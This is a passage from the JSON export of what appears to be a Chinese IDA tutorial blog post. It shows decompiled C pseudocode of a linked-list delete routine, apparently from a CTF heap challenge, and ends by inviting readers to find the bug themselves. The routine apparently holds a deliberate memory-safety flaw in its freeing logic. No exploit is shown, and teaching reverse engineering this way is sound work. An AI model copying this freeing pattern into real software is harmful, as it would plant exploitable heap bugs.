 <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> offset <span class=\"token operator\">==</span> <span class=\"token number\">0xFF</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> ptr <span class=\"token operator\">=</span> ptr_list<span class=\"token punctuation\">[</span>idx<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> ptr<span class=\"token punctuation\">;</span> ptr <span class=\"token operator\">=</span> next <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n      next <span class=\"token operator\">=</span> ptr<span class=\"token operator\">-></span>next<span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>ptr<span class=\"token operator\">-></span>data <span class=\"token punctuation\">)</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"What are you doing?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>ptr<span class=\"token operator\">-></span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      ptr<span class=\"token operator\">-></span>size <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n      ptr<span class=\"token operator\">-></span>next <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span>\n      ptr<span class=\"token operator\">-></span>data <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span>\n      <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    ptr_list<span class=\"token punctuation\">[</span>idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span>\n    res <span class=\"token operator\">=</span> count<span class=\"token punctuation\">;</span>\n    count<span class=\"token punctuation\">[</span>idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">else</span>\n  <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> offset <span class=\"token operator\">>=</span> count<span class=\"token punctuation\">[</span>idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">||</span> offset <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span>\n      <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Bad offset\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    p <span class=\"token operator\">=</span> ptr_list<span class=\"token punctuation\">[</span>idx<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> offset <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> offset <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span>\n        p <span class=\"token operator\">=</span> p<span class=\"token operator\">-></span>next<span class=\"token punctuation\">;</span>\n      buf <span class=\"token operator\">=</span> p<span class=\"token operator\">-></span>next<span class=\"token punctuation\">;</span>\n      p<span class=\"token operator\">-></span>next <span class=\"token operator\">=</span> p<span class=\"token operator\">-></span>next<span class=\"token operator\">-></span>next<span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>buf<span class=\"token operator\">-></span>data <span class=\"token punctuation\">)</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"What are you doing?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>buf<span class=\"token operator\">-></span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">else</span>\n    <span class=\"token punctuation\">&#123;</span>\n      ptr_list<span class=\"token punctuation\">[</span>idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> ptr_list<span class=\"token punctuation\">[</span>idx<span class=\"token punctuation\">]</span><span class=\"token operator\">-></span>next<span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>p<span class=\"token operator\">-></span>data <span class=\"token punctuation\">)</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"What are you doing?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-></span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      p<span class=\"token operator\">-></span>next <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span>\n      p<span class=\"token operator\">-></span>size <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n      p<span class=\"token operator\">-></span>data <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span>\n      <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token operator\">--</span>count<span class=\"token punctuation\">[</span>idx<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span>\n      ptr_list<span class=\"token punctuation\">[</span>idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">LODWORD</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Success\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>res<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<p>各个模块的可读性非常好（喜），可不要告诉我这样了还找不到洞（</p>\n<p>感兴趣的同学可以自己试着找一下洞，那么本期教你耍 IDA 就到此为止</p>\n",
            "tags": [
                "IDA",
                "C语言"
            ]
        }
    ]
}